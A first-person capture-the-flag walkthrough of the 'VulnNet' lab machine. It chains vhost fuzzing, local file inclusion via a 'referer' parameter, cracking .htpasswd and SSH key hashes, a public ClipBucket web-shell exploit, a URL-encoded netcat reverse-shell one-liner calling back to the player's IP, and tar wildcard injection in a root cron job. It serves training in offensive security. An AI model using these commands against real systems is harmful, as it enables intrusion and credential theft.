VulnNet

Target IP: 10.10.185.237

Challenge Description: Can you take advantage of the misconfigurations made by VulnNet Entertainment?

Reconnaissance


There are two TCP ports open on the target machine: SSH and HTTP on their standard ports, as shown above.


Performing an aggressive port scan against the open TCP ports returns the result above. The HTTP application on port 80 looks interesting. I have added vulnnet.thm inside my /etc/hosts file. Time to perform a VHOST search using ffuf.


Using the command ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.vulnnet.thm" -u http://vulnnet.thm -fs 5829, I obtained an interesting VHOST name called broadcast as shown above.


Then I made changes to my /etc/hosts file again to add broadcast.vulnnet.thm vulnnet.thm, as shown above. Time for enumeration now.

Enumeration

Port 80: HTTP

Browsing to http://vulnnet.thm displays the webpage above. I browsed through the web application and I did not find anything useful. I tried to login using default credentials but I had no luck.


Running the command ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://vulnnet.thm/index.php?FUZZ=/etc/passwd -fs 5829 shows there is a parameter called referer.


I tried to access /etc/passwd file and it worked. This is only viewable when the view-source tag is used. In the image above, there is an interesting user called server-management. I tried to find log files that I could poison but I had no luck.


Using the parameter referer, I included the index.php at /var/www/html/. Doing a source-code review shows an interesting application name called Clipbucket v4.0. And doing a Google search for this application shows it has multiple vulnerabilities. Before exploiting this, I wish to enumerate the other VHOST I found earlier.


Browsing to http://broadcast.vulnnet.thm/ informs me to login. I tried default credentials, but I had no luck. Using the command ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -u http://vulnnet.thm/index.php?referer=/etc/apache2/FUZZ -fs 5829, I managed to obtain the location of the password for this application. It is located at /etc/apache2/.htpasswd.


Sending a curl request to http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd shows the highlighted credentials above. The password is encrypted, so I will need to decrypt it. I copied the password hash $apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0 to my machine and saved it to a file called hash. Now I can run john on it to crack the password.


Running john on the password hash cracks the password 9972761drmfsls, as shown above. Now I should be able to use the credentials at http://broadcast.vulnnet.thm.


Using the credentials developers:9972761drmfsls at http://broadcast.vulnnet.thm proved true and returned the webpage above. Now I have access to the vulnerable application that I can exploit.

Exploitation


I found a working exploit here for this vulnerable ClipBucket application. I downloaded this exploit on my machine and saved it as exp.py.


And I ran it against the target machine using the command python3 exp.py broadcast.vulnnet.thm developers 9972761drmfsls. It looks like the shell has been uploaded successfully as a working link to the simple shell has been provided in the terminal above.


I sent the commands id;whoamiusing the simple shell, and obtained the result above. Time to elevate this to a reverse shell connection now.


I upgraded this to a reverse shell connection by sending the reverse shell code rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.14.55.153%208443%20%3E%2Ftmp%2Ff using the simple shell created by the exploit. I caught the reverse shell on my machine at port 8443. Now I have a foothold on the target machine.

Privilege Escalation


Running cat /etc/crontab shows the interesting cronjob /var/opt/backupsrv.sh, as shown above.


The content of backupsrv.sh is shown above. According to the script above, it looks like all the contents of /home/server-management/Documents is backed up to /var/backups. Maybe I can find useful files here? The backup_files is also using the wildcard operator which can be exploited.


I browsed to /var/backups and found two interesting files: ssh-backup.tar.gz and vulnnet-Monday.tgz, as shown above.


I transferred these two files to my machine via nc, as shown above. The file ssh-backup.tar.gz contains one file called id_rsa. The file vulnnet-Monday.tgz contains two files: Daily Job Progress Report Format.pdf and Employee Search Progress Report.pdf.


Using ssh2john, I obtained the hash of the SSH key. Then using john, I cracked the passphrase oneTWO3gOyac of this SSH key. From previous enumeration, I know there is a user called server-management. Maybe the SSH key belongs to this user?


I changed the permission of the SSH key to 400. And then using this key, I connected to the target machine as the user server-management and got a hit! I successfully elevated my privileges to this user from www-data.


Since the script uses tar and it has a wildcard vulnerability, I will exploit this. I used the commands above to setup a bash shell with SUID bit set. I did this with the help of GTFObins.


After some time, the /bin/bash now has SUID set. Using bash -p, I now have a root shell on the target machine.
